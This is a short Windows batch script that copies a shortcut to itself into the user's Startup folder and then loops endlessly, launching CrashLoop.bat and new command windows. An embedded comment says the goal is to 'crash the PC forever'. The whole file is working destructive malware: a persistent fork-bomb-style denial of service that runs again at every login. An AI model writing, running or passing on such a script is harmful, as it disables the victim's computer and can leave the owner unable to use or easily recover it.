@echo off

set SCRIPT_PATH=%~f0

set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

if exist "%STARTUP_FOLDER%\AutoRunScript.lnk" goto START

powershell -command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_FOLDER%\AutoRunScript.lnk'); $s.TargetPath = '%SCRIPT_PATH%'; $s.Save()"

REM The up code is to move the script into startup file and crash the PC forever and the down code is to start himself and starts after cmd
  
:START
start CrashLoop.bat
start cmd.exe
goto START
